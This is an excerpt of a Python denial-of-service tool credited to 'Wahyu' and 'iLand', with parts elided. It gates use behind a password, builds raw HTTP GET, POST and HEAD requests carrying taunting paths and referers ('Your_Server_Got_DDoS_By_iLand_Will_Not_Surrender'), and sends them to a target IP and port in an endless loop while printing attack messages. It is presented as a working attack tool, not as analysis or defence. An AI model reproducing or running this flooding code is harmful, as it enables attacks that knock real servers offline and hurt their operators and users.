...
try:
    import socks, requests, socket
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install pysocks requests socket")
...
import time
import os
os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Used By Wahyu [ What Password ]")
password = input("[ + ] Password : ")
if password == "subscribeytgw12@":
...
referers = [
     'Your_Server_Got_DDoS_By_iLand_Will_Not_Surrender',
     'Your_Server_Got_DDoS_By_iLand_Will_Not_Surrender',
     'Your_Server_Got_DDoS_By_iLand_Will_Not_Surrender',
     'Your_Server_Got_DDoS_By_iLand_Will_Not_Surrender',
     'Your_Server_Got_DDoS_By_iLand_Will_Not_Surrender',
...
if sys.platform.startswith("linux"):
   ...
   os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Used By Wahyu [ DDoS Attack ]")
print("============================================================")
print("██╗██╗      █████╗ ███╗   ██╗██████╗       ██╗   ██╗██████╗ ")
print("██║██║     ██╔══██╗████╗  ██║██╔══██╗      ██║   ██║╚════██╗")
print("██║██║     ███████║██╔██╗ ██║██║  ██║█████╗██║   ██║ █████╔╝")
...
print("                                                            ")
print("============================================================")
print("[ + ] Author/Use : Wahyu")
print("[ + ] Update Tool: Me")
print("==========================")
...
def Headers(method):
    ...
    if method == "get" or method == "head":
        post_host = "POST /Your_Server_Got_DDoS_By_iLand_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
...
def run():
    ...
    if method_attack == "1":
        get_host = "GET /Your_Server_Got_DDoS_By_iLand_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Your_Server_Got_DDoS_By_iLand_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
            ...
            s.close()
            print("[ + ] Wahyu Attacking Server IP => ",ip," In Port ",port,"!")
